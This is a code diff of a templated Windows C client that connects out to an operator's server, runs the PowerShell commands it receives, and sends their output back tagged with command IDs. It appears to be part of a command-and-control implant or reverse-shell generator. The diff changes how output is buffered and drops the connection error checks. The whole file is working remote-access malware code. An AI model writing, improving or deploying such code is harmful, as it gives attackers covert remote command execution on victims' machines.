@@ -8,7 +8,6 @@
 #define SERVER_IP "{{.IP_SERVER}}"
 #define SERVER_PORT {{.PORT_SERVER}}
 #define TIMEOUT_MS 10000
-#define BUFFER_SIZE 4096
 
 void run_powershell_command(SOCKET sock, const char* cmdID, const char* command) {
     char fullCommand[1024];
@@ -20,7 +19,6 @@ void run_powershell_command(SOCKET sock, const char* cmdID, const char* command)
     if (!CreatePipe(&hStdOutRead, &hStdOutWrite, &sa, 0)) {
         char errMsg[512];
         snprintf(errMsg, sizeof(errMsg), "OUT:%s:[!] Pipe creation failed\n", cmdID);
-        printf("%s\n", errMsg);
         send(sock, errMsg, strlen(errMsg), 0);
         return;
     }
@@ -45,68 +43,54 @@ void run_powershell_command(SOCKET sock, const char* cmdID, const char* command)
     if (!success) {
         char errMsg[512];
         snprintf(errMsg, sizeof(errMsg), "OUT:%s:[!] Command launch failed\n", cmdID);
-        printf("%s\n", errMsg);
         send(sock, errMsg, strlen(errMsg), 0);
         CloseHandle(hStdOutRead);
         return;
     }
 
-    char buffer[BUFFER_SIZE + 1];
     DWORD exitCode = STILL_ACTIVE;
     DWORD startTime = GetTickCount();
-    DWORD bytesRead;
 
-    char lineBuf[BUFFER_SIZE * 2]; // To stack partially read lines
-    size_t lineLen = 0;
+    char buffer[512];
+    DWORD bytesRead;
 
     while (GetTickCount() - startTime < TIMEOUT_MS) {
         if (PeekNamedPipe(hStdOutRead, NULL, 0, NULL, &bytesRead, NULL) && bytesRead > 0) {
-
-            if (ReadFile(hStdOutRead, buffer, BUFFER_SIZE, &bytesRead, NULL) && bytesRead > 0) {
+            if (ReadFile(hStdOutRead, buffer, sizeof(buffer) - 1, &bytesRead, NULL)) {
                 buffer[bytesRead] = '\0';
 
-                // Stack in buffer line
-                memcpy(lineBuf + lineLen, buffer, bytesRead);
-                lineLen += bytesRead;
-                lineBuf[lineLen] = '\0';
-
-                // Replace \r\n by \n to simplify
-                for (size_t i = 0; i < lineLen; i++) {
-                    if (lineBuf[i] == '\r') lineBuf[i] = '\n';
-                }
-
-                // Process line by line
                 char* lineStart = buffer;
                 char* newline;
 
                 while ((newline = strchr(lineStart, '\n')) != NULL) {
                     *newline = '\0';
 
-                    // ignore empty lines
+                    // Ignore les lignes vides
                     if (strlen(lineStart) > 0 && strspn(lineStart, " \r") != strlen(lineStart)) {
-                        char outLine[BUFFER_SIZE * 2];
+                        char outLine[600];
                         snprintf(outLine, sizeof(outLine), "OUT:%s:%s\n", cmdID, lineStart);
-                        printf("%s\n", outLine);
                         send(sock, outLine, strlen(outLine), 0);
+                        printf("%s\n", outLine);
                     }
 
                     lineStart = newline + 1;
                 }
 
-                // if remainder (when no newline at end)
-                lineLen = strlen(lineStart);
-                memmove(lineBuf, lineStart, lineLen);
-                lineBuf[lineLen] = '\0';
-
-                startTime = GetTickCount();          
+                // If remainder (when no newline at end)
+                if (strlen(lineStart) > 0 && strspn(lineStart, " \r") != strlen(lineStart)) {
+                    char outLine[600];
+                    snprintf(outLine, sizeof(outLine), "OUT:%s:%s\n", cmdID, lineStart);
+                    send(sock, outLine, strlen(outLine), 0);
+                    printf("%s\n", outLine);
+                    startTime = GetTickCount(); // Reset timer on activity
+                }          
             }
-
         }
 
         GetExitCodeProcess(pi.hProcess, &exitCode);
         if (exitCode != STILL_ACTIVE) break;
 
-        Sleep(50);
+        Sleep(100);
     }
 
     // If still active after timeout
@@ -114,7 +98,6 @@ void run_powershell_command(SOCKET sock, const char* cmdID, const char* command)
         TerminateProcess(pi.hProcess, 1);
         char interactMsg[512];
         snprintf(interactMsg, sizeof(interactMsg), "OUT:%s:[!] Command cancelled due to timeout or interactivity\n", cmdID);
-        printf("%s\n", interactMsg);
         send(sock, interactMsg, strlen(interactMsg), 0);
     }
 
@@ -124,7 +107,6 @@ void run_powershell_command(SOCKET sock, const char* cmdID, const char* command)
 
     char endMsg[64];
     snprintf(endMsg, sizeof(endMsg), "END:%s\n", cmdID);
-    printf("%s\n", endMsg);
     send(sock, endMsg, strlen(endMsg), 0);
 }
 
@@ -145,12 +127,7 @@ int main() {
     server.sin_family = AF_INET;
     server.sin_port = htons(SERVER_PORT);
 
-    if (connect(sock, (struct sockaddr*)&server, sizeof(server)) == SOCKET_ERROR) {
-        printf("Connection failed: %d\n", WSAGetLastError());
-        closesocket(sock);
-        WSACleanup();
-        return 1;
-    }
+    connect(sock, (struct sockaddr*)&server, sizeof(server));
 
     // ID du client
     char* clientID = "{{.ID}}\n";
